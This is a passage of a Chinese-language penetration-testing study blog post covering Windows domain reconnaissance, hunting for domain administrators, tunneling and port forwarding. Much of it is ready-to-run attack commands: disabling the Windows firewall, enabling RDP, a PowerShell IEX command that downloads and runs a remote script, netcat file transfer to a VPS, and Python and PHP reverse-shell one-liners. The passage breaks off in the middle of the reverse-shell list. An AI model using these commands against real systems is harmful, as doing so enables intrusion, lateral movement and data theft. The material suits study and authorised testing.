class="hljs-builtin-name">get</span> Caption,CSDVersion,OSArchitecture,Version 查看操作系统（基本systeminfo里面都有）<br>wmic product <span class="hljs-builtin-name">get</span> name,version 查看当前安装的程序<br>wmic<span class="hljs-built_in"> service </span>list brief 查询本机服务信息<br>wmic process list brief 查询进程列表<br>tasklist /v 查询进程列表<br>wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct <span class="hljs-builtin-name">Get</span> displayName /Format:list 查杀软<br><br>防火墙相关：<br>关闭防火墙：<br>	windows<span class="hljs-built_in"> server </span>2003及以前：netsh<span class="hljs-built_in"> firewall </span><span class="hljs-builtin-name">set</span> opmode disable<br>	windows<span class="hljs-built_in"> server </span>2003以后：netsh advfirewall <span class="hljs-builtin-name">set</span> allprofiles state off<br>查看防火墙配置：netsh<span class="hljs-built_in"> firewall </span>show config<br>修改防火墙配置：<br>	windows<span class="hljs-built_in"> server </span>2003及以前允许指定程序全部连接：netsh<span class="hljs-built_in"> firewall </span><span class="hljs-builtin-name">add</span> allowedprogram c:\nc.exe <span class="hljs-string">&quot;allow nc&quot;</span> enable<br>	windows<span class="hljs-built_in"> server </span>2003以后版本：<br>		允许指定程序接入：netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-builtin-name">add</span> rule <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;pass nc&quot;</span> <span class="hljs-attribute">dir</span>=in <span class="hljs-attribute">action</span>=allow <span class="hljs-attribute">program</span>=<span class="hljs-string">&quot;C:\nc.exe&quot;</span><br>		允许指定程序退出：netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-builtin-name">add</span> rule <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Allow nc&quot;</span> <span class="hljs-attribute">dir</span>=out <span class="hljs-attribute">action</span>=allow <span class="hljs-attribute">program</span>=<span class="hljs-string">&quot;c:\nc.exe&quot;</span><br>		允许3389端口开放：netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-builtin-name">add</span> rule <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Remote Desktop&quot;</span> <span class="hljs-attribute">protocol</span>=TCP <span class="hljs-attribute">dir</span>=in <span class="hljs-attribute">localport</span>=3389 <span class="hljs-attribute">action</span>=allow<br>		自定义防火墙日志的存储位置：netsh advfirewall <span class="hljs-builtin-name">set</span> currentprofile<span class="hljs-built_in"> logging </span>filename <span class="hljs-string">&quot;c:\windows\temp\fw.log&quot;</span><br><br>查看代理：reg query <span class="hljs-string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><br><br>查看远程服务连接端口：REG QUERY <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /V PortNumber<br><br>Windows<span class="hljs-built_in"> Server </span>2003中开启3389：wmic path win32_terminalservicesetting where (__CLASS!=<span class="hljs-string">&quot;&quot;</span>) <br>call setallowtsconnections 1<br><br>windows<span class="hljs-built_in"> Server </span>2008和2012中开启3389：<br>	1. wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS!=<span class="hljs-string">&quot;&quot;</span>) 	call setallowtsconnections 1<br>	2. wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (<span class="hljs-attribute">TerminialNAme</span>=<span class="hljs-string">&#x27;RDP-Tcp&#x27;</span>) call setuserauthenticationrequired 1<br>	3. reg <span class="hljs-builtin-name">add</span> <span class="hljs-string">&quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot;</span> /v fSingleSessionPerUSer /t REG_DWORD /d 0 /f<br></code></pre></td></tr></table></figure>
+
+<h5 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h5><blockquote>
+<p>工作组的信息收集感觉和上面差不多，平时没怎么遇到过</p>
+</blockquote>
+<h5 id="域"><a href="#域" class="headerlink" title="域"></a>域</h5><p>当内网中存在域，那么<strong>本地的普通用户</strong>只能查询到<strong>本机的相关信息</strong>不能查询到域内信息，本地管理员用户和域内用户可以查询域内信息。原理是：域内的所有查询都是通过域控制器实现的（基于LDAP协议），而这个<strong>查询需要权限</strong>认证，所以只有域用户才拥有这个权限；域用户执行查询命令时，会自动使用kerberos协议认证，无需输入额外的账户密码。</p>
+<p>本地管理员Administrator权限可以直接提升为Ntauthority或者system权限，在域中除了普通用户以外，所有机器都有一个机器用户（用户名是机器名加上$），本质上<strong>机器的system用户对应的就是域内的机器用户</strong>，所以使用system权限可以运行域内的查询命令</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs routeros">判断是否有域：<br>	systeminfo<br>	ipconfig /all 查看网关IP，DNS的IP，域名，本机是否和DNS服务器处于同一网段，然后使用nslookup解析域名的IP，判断域控和DNS是否在同一服务器<br>	<br>whoami /all  获取域SID<br>net<span class="hljs-built_in"> config </span>workstation 查看当前登录域<br>net time /domain 判断主域（域服务器通常作为时间服务器使用）<br><br>net<span class="hljs-built_in"> user </span>/domain 获得所有域用户列表<br>net<span class="hljs-built_in"> user </span>xxx /domain 查询指定用户详细信息<br>wmic useraccount <span class="hljs-builtin-name">get</span> /all 获取域内用户详细信息<br>dsquery<span class="hljs-built_in"> user </span>查看存在的用户<br><br>net view /domain 查询域<br>net view /domain:domain_name 查询域内所有计算机<br><br>net<span class="hljs-built_in"> group </span>/domain 获得所有域用户组列表<br>net<span class="hljs-built_in"> group </span><span class="hljs-string">&quot;domain computers&quot;</span> /domain 查询域成员计算机<br>net<span class="hljs-built_in"> group </span><span class="hljs-string">&quot;Domain Controllers&quot;</span> /domain 查看域控制器组（一个域内一般存在两台或者两台以上的域控制器，防灾）<br>net<span class="hljs-built_in"> group </span><span class="hljs-string">&quot;domain admins&quot;</span> /domain 获得域管理员列表<br>net<span class="hljs-built_in"> group </span><span class="hljs-string">&quot;Enterprise Admins&quot;</span> /domain 查询管理员用户组	<br>net localgroup administrators 获取本地管理员（通常包含域用户）信息<br><br>net accounts /domain 获取域密码信息<br>nltest /domain_trusts 获取域信任信息<br><br>nltest /DCLIST:domain_name 查看域控机器名<br>netdom query pdc 查看域控机器名<br>Nslookup <span class="hljs-attribute">-type</span>=SRV _ldap._tcp 查看域控制器主机名<br><br>tasklist /v 列出本机进程和进程用户（需要注意是否有域管理员的进程）<br></code></pre></td></tr></table></figure>
+
+<p><strong>探测域内存活主机</strong></p>
+<ol>
+<li><code>nbtscan</code>：下载：<a target="_blank" rel="noopener" href="http://unixwiz.net/tools/nbtscan.html">http://unixwiz.net/tools/nbtscan.html</a> 传入靶机执行<code>nbt.exe ip段</code> 即可</li>
+<li>利用ICMP协议探测：<code>for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL=&quot;</code></li>
+<li>ARP扫描内网：windows版 <a target="_blank" rel="noopener" href="https://github.com/QbsuranAlang/arp-scan-windows-">https://github.com/QbsuranAlang/arp-scan-windows-</a> 其他版本<a target="_blank" rel="noopener" href="https://github.com/royhills/arp-scan">https://github.com/royhills/arp-scan</a> </li>
+<li>Empire中的arpscan模块，输入<code>unamemodule situational_awareness/network/arpscan</code></li>
+<li>使用Nishang中的Invoke-ARPScan.ps1脚本</li>
+<li>使用TCP、UDP端口扫描探测内网，ScanLine工具（使用体验不是很好）</li>
+</ol>
+<p><strong>扫描域内端口</strong></p>
+<p>工具下载：<a target="_blank" rel="noopener" href="https://pan.wgpsec.org/public/4-%E5%90%8E%E6%B8%97%E9%80%8F%20&amp;%20%E5%9F%9F%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B">https://pan.wgpsec.org/public/4-%E5%90%8E%E6%B8%97%E9%80%8F%20&amp;%20%E5%9F%9F%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B</a></p>
+<ol>
+<li><p>利用telnet命令扫描</p>
+</li>
+<li><p>s扫描器</p>
+</li>
+<li><p>MSF端口扫描</p>
+</li>
+<li><p>powershell的Invoke-portscan.ps1脚本，推荐使用无文件形式扫描</p>
+<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs latex">powershell.exe -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&#x27;);Invoke-Portscan -Hosts 192.168.1.0/24 -T 4 -ports &#x27;445,1433,8080,3389,80&#x27; -oA c:<span class="hljs-tag">\<span class="hljs-name">windows</span></span><span class="hljs-tag">\<span class="hljs-name">temp</span></span><span class="hljs-tag">\<span class="hljs-name">res</span></span>.txt&quot;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>Nishang的Invoke-PortScan模块</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">Invoke-PortScan -StartAddress <span class="hljs-number">192.168</span><span class="hljs-number">.250</span><span class="hljs-number">.1</span> -EndAddress <span class="hljs-number">192.168</span><span class="hljs-number">.250</span><span class="hljs-number">.255</span> -ResolveHost<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>如果发现了端口，可以使用客户端连接工具或者nc获取服务端的Banner信息（需要注意一些平时的特定端口）</p>
+</li>
+</ol>
+<p><strong>域管理员定位</strong></p>
+<p>当计算机加入域后会默认给域管理员赋予本地系统管理员权限，域管理员组的成员均可访问本地计算机，并且具备完全的控制权限。在域网络攻击测试中，获取域内的一个支点后，需要获取域管理员的权限。</p>
+<p>假设现在在Windows域中取得了普通用户权限，希望在域中横向移动，需要找到域内用户的登录位置，他是否是任何系统的本地管理员，他所属的组，他是否有单访问文件共享等。枚举主机，用户和组，有助于更好的了解域的布局。</p>
+<ol>
+<li><p><code>psloggedon.exe</code> 可以查看本地登录的用户和通过本地计算机或远程计算机的资源登录的用户（某些功能需要管理员权限）</p>
+<p>下载：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon">https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon</a></p>
+</li>
+<li><p><code>PVEFindADUser.exe</code> 用于查找活动目录用户登录的位置，枚举域用户，以及在特定计算机上登录的用户，包括本地用户，通过RDP登录的用户，用于运行服务和计划任务的用户。（运行需要管理员权限）</p>
+<p>下载：<a target="_blank" rel="noopener" href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn">https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn</a></p>
+</li>
+<li><p><code>netview.exe</code>枚举工具，使用了WinAPI枚举系统，利用NetSessionEnum找寻登录会话，利用NetShareEnum找寻共享，利用NetWkstaUserEnum枚举登录用户。能够查询共享入口和有价值的用户，大部分功能不需要管理员权限</p>
+<p>下载：<a target="_blank" rel="noopener" href="https://github.com/mubix/netview/releases">https://github.com/mubix/netview/releases</a></p>
+</li>
+<li><p><code>Nmap</code>的NSE脚本</p>
+<ul>
+<li><code>smb—enum-domains.nse</code>：对域控进行信息收集，可以获取主机信息，用户，可使用密码策略的用户</li>
+<li><code>smb—enum-users.nse</code>：渗透测试时如果获取到域内某台主机的权限，但是权限有限无法获取更多的域用户信息时，可以使用这个脚本来对域控制器进行扫描</li>
+<li><code>smb—enum-shares.nse</code>：遍历远程主机的共享目录</li>
+<li><code>smb—enum-processes.nse</code>：对主机系统进程遍历，从而知道目标主机运行了哪些软件</li>
+<li><code>smb—enum-sessions.nse</code>：获取域内主机的用户登录会话，查看当前是否有用户登录</li>
+<li><code>smb—enum-discovery.nse</code>：收集目标主机的信息（操作系统，计算机名，域名…………）</li>
+</ul>
+<p>脚本下载链接：<a target="_blank" rel="noopener" href="https://nmap.org/nsedoc/scripts/">https://nmap.org/nsedoc/scripts/</a></p>
+</li>
+<li><p><code>PowerView</code>脚本，它是<code>powershell</code>的脚本，提供了辅助定位关键用户的功能</p>
+<p>下载：<a target="_blank" rel="noopener" href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView">https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView</a></p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs groovy">Get-<span class="hljs-attr">NetDomain:</span> 获取当前用户所在域的名称 <br>Get-<span class="hljs-attr">NetUser:</span> 获取所有用户的详细信息 <br>Get-<span class="hljs-attr">NetDomainController:</span> 获取所有域控制器的信息 <br>Get-<span class="hljs-attr">NetComputer:</span> 获取域内所有机器的详细信息 <br>Get-<span class="hljs-attr">NetOU:</span> 获取域中的OU信息 <br>Get-<span class="hljs-attr">NetGroup:</span> 获取所有域内组和组成员信息 <br>Get-<span class="hljs-attr">NetFileServer:</span> 根据SPN获取当前域使用的文件服务器信息 <br>Get-<span class="hljs-attr">NetShare:</span> 获取当前域内所有网络共享信息 <br>Get-<span class="hljs-attr">NetSession:</span> 获取指定服务器的会话 <br>Get-<span class="hljs-attr">NetRDPSession:</span> 获取指定服务器的远程连接 <br>Get-<span class="hljs-attr">NetProcess:</span> 获取远程主机的进程 <br>Get-<span class="hljs-attr">UserEvent:</span> 获取指定用户的日志 <br>Get-<span class="hljs-attr">ADObiect:</span> 获取活动目录的对象 <br>Get-<span class="hljs-attr">NetGPO:</span> 获取域内所有的组策略对象 <br>Get-<span class="hljs-attr">DomainPolicy:</span> 获取域默认策略或域控制器策略 <br>Invoke-<span class="hljs-attr">UserHunter:</span> 获取域用户登录的计算机信息及该用户是否有本地管理员权限 <br>Invoke-<span class="hljs-attr">ProcessHunter:</span> 通过查询域内所有的机器进程找到特定用户 <br>Invoke-<span class="hljs-attr">UserEvenHunter:</span> 根据用户日志查询某域用户登录过哪些域机器。<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>Empire的user_hunter模块</p>
+</li>
+</ol>
+<p><strong>查找域管理进程</strong></p>
+<p>假设：在某个内网环境中获得了一个域普通用户的权限，然后提权<strong>获得了当前服务器的本地管理员权限</strong>，然后分析当前服务器的用户登录列表以及会话信息，知道了哪些用户登录了这台服务器，但是最后发现可以获取权限的登录用户<strong>都不是域管理账户，</strong>同时<strong>没有域管理员组中的用户登录这台服务器</strong>，就可以使用另一个账户并<strong>寻找该账户在内网哪台机器上具有权限</strong>，<strong>再枚举这台机器上的登录用户</strong>，然后继续渗透测试知道获得域管理员权限为止。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">net<span class="hljs-built_in"> group </span><span class="hljs-string">&quot;domain admins&quot;</span> /domain 收集域管理员列表<br>tasklist /v 查询进程和进程所属用户（注意管理员用户）<br>net<span class="hljs-built_in"> group </span><span class="hljs-string">&quot;domain controllers&quot;</span> /domain 查询域控制器列表<br></code></pre></td></tr></table></figure>
+
+<p>收集所有活动域的会话列表：使用netsess.exe ：<code>NetSess -h</code></p>
+<p>交叉引用域管理员列表和活动会话列表：这样可以确定哪些IP地址具有活动域令牌，可以使用<code>netsess.exe</code>的windows命令行。将域控制器列表添加到dcs.txt 将域管理员列表添加到admins.txt中，并与netsess.exe放在同一目录下，运行</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">FOR /F <span class="hljs-symbol">%i</span> in (dcs.txt) do <span class="hljs-title">@echo</span> [+] Querying DC <span class="hljs-symbol">%i</span> &amp;&amp; <span class="hljs-title">@netsess</span> -h <span class="hljs-symbol">%i</span> <span class="hljs-number">2</span>&gt;<span class="hljs-keyword">null</span> &gt;sessions.txt &amp;&amp; FOR /F <span class="hljs-symbol">%a</span> in (admin.txt) DO <span class="hljs-title">@type</span> sessions.txt | <span class="hljs-title">@findstr</span> /I <span class="hljs-symbol">%a</span><br></code></pre></td></tr></table></figure>
+
+<p>如果目标机器是在域系统中是通过共享的本地管理员账户运行的，就可以使用下列脚本来查询系统中的域管理任务</p>
+<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sas">FOR /F <span class="hljs-name">%i</span> <span class="hljs-meta">in</span> (ips.txt) <span class="hljs-meta">DO</span> @echo [+] <span class="hljs-name">%i</span> <span class="hljs-variable">&amp;&amp;</span> @tasklist /V /S <span class="hljs-name">%i</span> /U user /P password 2&gt;<span class="hljs-meta">NULL</span> &gt; <span class="hljs-meta">output</span>.txt <span class="hljs-variable">&amp;&amp;</span> FOR /F <span class="hljs-name">%n</span> <span class="hljs-meta">in</span> (name.txt) <span class="hljs-meta">DO</span> @type <span class="hljs-meta">output</span>.txt | findstr <span class="hljs-name">%n</span> &gt; <span class="hljs-meta">NULL</span> <span class="hljs-variable">&amp;&amp;</span> echo [!] <span class="hljs-name">%n</span> was found running a process <span class="hljs-meta">on</span> <span class="hljs-name">%i</span> <span class="hljs-variable">&amp;&amp;</span> pause<br>ips.txt 系统列表<br>names.txt 域管理员列表<br></code></pre></td></tr></table></figure>
+
+<p>某些版本的windows操作系统允许用户通过NetBIOS查询已经登录用户，可以运行下面这个命令行脚本扫描远程系统活跃中的管理员会话</p>
+<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sas">for /F <span class="hljs-name">%i</span> <span class="hljs-meta">in</span> (ips.txt) <span class="hljs-meta">do</span> @echo [+] Checking <span class="hljs-name">%i</span> <span class="hljs-variable">&amp;&amp;</span> nbtstat -A <span class="hljs-name">%i</span> 2&gt;<span class="hljs-meta">NULL</span> &gt;nbsessions.txt <span class="hljs-variable">&amp;&amp;</span> FOR /F <span class="hljs-name">%n</span> <span class="hljs-meta">in</span> (admins.txt) <span class="hljs-meta">DO</span> @type nbsessions.txt | findstr /I <span class="hljs-name">%n</span> &gt; <span class="hljs-meta">NULL</span> <span class="hljs-variable">&amp;&amp;</span> echo [!] <span class="hljs-name">%n</span> was found logged <span class="hljs-meta">into</span> <span class="hljs-name">%i</span><br>ips.txt 系统列表<br>names.txt 域管理员列表<br></code></pre></td></tr></table></figure>
+
+<p>也可以使用<code>nbtscan</code>工具</p>
+<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">for /F <span class="hljs-name">%i</span> <span class="hljs-meta">in</span> (ips.txt) <span class="hljs-meta">do</span> @echo [+] Checking <span class="hljs-name">%i</span> <span class="hljs-variable">&amp;&amp;</span> nbtstat -f <span class="hljs-name">%i</span> 2&gt;<span class="hljs-meta">NULL</span> &gt;nbsessions.txt <span class="hljs-variable">&amp;&amp;</span> FOR /F <span class="hljs-name">%n</span> <span class="hljs-meta">in</span> (admins.txt) <span class="hljs-meta">DO</span> @type nbsessions.txt | findstr /I <span class="hljs-name">%n</span> &gt; <span class="hljs-meta">NULL</span> <span class="hljs-variable">&amp;&amp;</span> echo [!] <span class="hljs-name">%n</span> was found logged <span class="hljs-meta">into</span> <span class="hljs-name">%i</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>域分析工具</strong>：<code>BloodHound</code></p>
+<blockquote>
+<p>以上提到的工具的具体使用需要结合实战靶场</p>
+</blockquote>
+<h4 id="隐藏通信隧道技术"><a href="#隐藏通信隧道技术" class="headerlink" title="隐藏通信隧道技术"></a>隐藏通信隧道技术</h4><p>一般的网络通信就是先在两台机器之间建立TCP连接，然后进行正常的数据通信。</p>
+<p>隧道：一种绕过端口屏蔽的通信方法。防火墙两端的数据报通过防火墙所允许的数据包类型或者端口进行封装，然后穿过防火墙，与对方通信。当被封装的数据包到达目的地时，将数据还原，并将还原的数据包发送到相应的服务器上。</p>
+<p>常用的隧道</p>
+<ul>
+<li>网络层：IPV6隧道，ICMP隧道，GRE隧道</li>
+<li>传输层：TCP隧道，UDP隧道，常规端口转发</li>
+<li>应用层：ssh隧道，HTTP隧道，HTTPS隧道，DNS隧道</li>
+</ul>
+<h5 id="判断内网连通性"><a href="#判断内网连通性" class="headerlink" title="判断内网连通性"></a>判断内网连通性</h5><ol>
+<li>ICMP协议：<code>ping</code></li>
+<li>TCP协议：<code>netcat</code></li>
+<li>HTTP协议：<code>curl</code></li>
+<li>DNS协议：<code>nslookup</code>，<code>dig</code></li>
+</ol>
+<p>如果遇见流量不能直接流出，内网中有代理服务器时的判断方法</p>
+<ol>
+<li><p>查看内网中是否存在类似”proxy”名称的机器</p>
+</li>
+<li><p>查看IE浏览器的直接代理</p>
+</li>
+<li><p>更具pac文件的路径（本地路径或者远程路径），将其下载查看</p>
+</li>
+<li><p>利用curl工具确认</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">curl www<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>  <span class="hljs-comment">//不通</span><br>curl -x proxy-ip:port www<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span> <span class="hljs-comment">//通</span><br></code></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h5 id="网络层隧道技术"><a href="#网络层隧道技术" class="headerlink" title="网络层隧道技术"></a>网络层隧道技术</h5><p>在网络层中最常用的隧道协议就是IPv6和ICMP</p>
+<h6 id="IPv6隧道"><a href="#IPv6隧道" class="headerlink" title="IPv6隧道"></a><strong>IPv6隧道</strong></h6><p>IPv6隧道技术是指通过IPv4隧道传送IPv6数据报文的技术，工作原理过程：</p>
+<ol>
+<li>节点A向节点B发送IPv6报文，首先在节点A和节点B之间建立一个隧道</li>
+<li>节点A将<strong>IPv6报文封装</strong>在以节点<strong>B的IPv4地址为目的地</strong>，以<strong>自己的IPv4地址为源地址</strong>的<strong>IPv4报文中发送</strong></li>
+<li>这个报文和普通的IPv4报文一样，经过IPv4的转发到达节点B</li>
+<li>节点B收到此报文后，解除IPv4封装，取出其中的IPv6报文</li>
+</ol>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210730095849745.png" srcset="/img/loading.gif" lazyload alt="image-20210730095849745"></p>
+<blockquote>
+<p>即使设备支持IPv6，也可能无法正确分析封装了IPv6报文的IPv4数据包。</p>
+<p>配置隧道和自动隧道的主要区别：只有在执行隧道功能的节点的IPv6地址是IPv4兼容地址时，自动隧道才可行，为执行隧道功能的节点分配IP地址时，采用自动隧道方法就不需要进行配置；配置隧道的方法则要求隧道末端节点使用其他机制来获得其IPv4地址，例如DHCP，人工配置或者其他IPv4的配置机制</p>
+</blockquote>
+<p>支持IPv6的隧道工具有<code>socat</code>，<code>6tunnel</code>，<code>nt6unnel</code>等</p>
+<h6 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a><strong>ICMP隧道</strong></h6><p>如果攻击者使用各类上层隧道（HTTP隧道，DNS隧道，常规正/反向端口转发等）的操作都失败了，可以使用ping命令尝试建立ICMP隧道，将TCP/UDP数据封装到ICMP的ping数据包中，从而穿过防火墙。</p>
+<p>常见工具</p>
+<ol>
+<li><p><code>icmpsh</code>：<a target="_blank" rel="noopener" href="https://github.com/bdamele/icmpsh">https://github.com/bdamele/icmpsh</a></p>
+<p>使用的注意事项：</p>
+<ul>
+<li>需要安装<code>python-impacket</code>类</li>
+<li>需要关闭本地系统的ICMP应答，<code>sysctl -w net.ipv4.icmp_echo_ignore_all=1</code>（开启设置为0）</li>
+</ul>
+</li>
+<li><p><code>PingTunnel</code>：配置起来比较麻烦，需要安装很多环境</p>
+</li>
+<li><p><code>icmptunnel</code></p>
+</li>
+<li><p><code>powershell icmp</code></p>
+</li>
+</ol>
+<p><strong>防御方法</strong></p>
+<ul>
+<li>检测同一来源的数据包的数量</li>
+<li>注意Payload大于64bit的ICMP数据包</li>
+<li>寻找响应数据包中的payload与请求数据包中的payload不一致的ICMP数据包</li>
+<li>检查ICMP数据包的协议标签，例如<code>icmptunnel</code>会在所有的ICMP payload前面添加一个TUNL标记来标识隧道</li>
+</ul>
+<h5 id="传输层隧道技术"><a href="#传输层隧道技术" class="headerlink" title="传输层隧道技术"></a>传输层隧道技术</h5><p>传输层技术包括TCP隧道，UDP隧道和常规的端口转发。</p>
+<h6 id="lcx端口转发"><a href="#lcx端口转发" class="headerlink" title="lcx端口转发"></a><strong>lcx端口转发</strong></h6><p>lcx是一个基于Socket套接字实现的端口转发工具，有Windows（lcx.exe）和Linux（portmap）两个版本，一个正常的Socket隧道必须具备两端：一端为服务端，监听一个端口，等待客户端的连接；另一端为客户端，通过传入服务端的IP和端口才能主动与服务器连接</p>
+<p>下载：<a target="_blank" rel="noopener" href="https://github.com/UndefinedIdentifier/LCX">https://github.com/UndefinedIdentifier/LCX</a></p>
+<p><strong>内网端口转发</strong></p>
+<p>在目标主机上执行命令，将目标机器的3389端口的所有数据转发到公网VPS的4444端口上<code>lcx.exe -slave &lt;公网IP&gt; 4444 127.0.0.1 3389</code></p>
+<p>在VPS上执行命令，将本地4444端口上监听的所有数据转发到本机的5555端口上<code>lcx.exe -listen 4444 5555</code></p>
+<p>利用mstsc登录远程桌面&lt;公网IP&gt;:5555 或者在VPS上直接连接远程桌面127.0.0.1:5555</p>
+<p><strong>本地端口映射</strong></p>
+<p>如果目标服务器由于防火墙的限制，部分端口无法通过防火墙，可以将目标服务器的相应端口的数据传到防火墙允许的其他端口（例如53）<code>lcx -tran 53 &lt;目标主机IP地址&gt; 3389</code></p>
+<h6 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a><strong>netcat</strong></h6><p><strong>简单使用</strong></p>
+<ul>
+<li><p>抓取Banner信息<code>nc -nv 192.168.123.123 21</code> 抓取目标主机21端口的Banner信息</p>
+</li>
+<li><p>远程连接主机<code>nc -nvv 192.168.123.123 80</code></p>
+</li>
+<li><p>端口扫描<code>nc -v 192.168.123.123 80</code>  <code>nc -v -z 192.168.123.123 20-1024</code>（扫描端口段速度较慢）</p>
+</li>
+<li><p>端口监听<code>nc -l -p 9999</code> 监听本地端口，访问该端口时会输出该信息到命令行</p>
+</li>
+<li><p>文件传输vps输入<code>nc -lp 333 &gt; 1.txt</code> 目标主机输入<code>nc -vn 192.168.1.4 333 &lt; test.txt -q 1</code>一旦连接建立，数据便会流入</p>
+</li>
+<li><p>获取shell</p>
+<ul>
+<li><p>客户端连接服务器，客户端获取服务器shell这种称为正向shell</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210730113202468.png" srcset="/img/loading.gif" lazyload alt="image-20210730113202468"></p>
+</li>
+<li><p>客户端连接服务器，服务器获取客户端shell这种称为反向shell，反向shell通常用在开启防火措施的目标主机上</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210730113725281.png" srcset="/img/loading.gif" lazyload alt="image-20210730113725281"></p>
+</li>
+<li><p>目标主机没有nc时获取反向shell</p>
+<ul>
+<li><p>python反向shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&#x27;import socket,subprocess,os; \</span><br><span class="hljs-string">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span><br><span class="hljs-string">s.connect((&quot;192.168.1.4&quot;,2222));</span><br><span class="hljs-string">os.dup2(s.fileno(),0);</span><br><span class="hljs-string">os.dup2(s.fileno(),1);</span><br><span class="hljs-string">os.dup2(s.fileno(),2);</span><br><span class="hljs-string">p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>PHP反向shell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">php -r <span class="hljs-string">&#x27;$sock=fsockopen(&quot;192.168.1.4&quot;,2222);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>Perl反向shell</p>
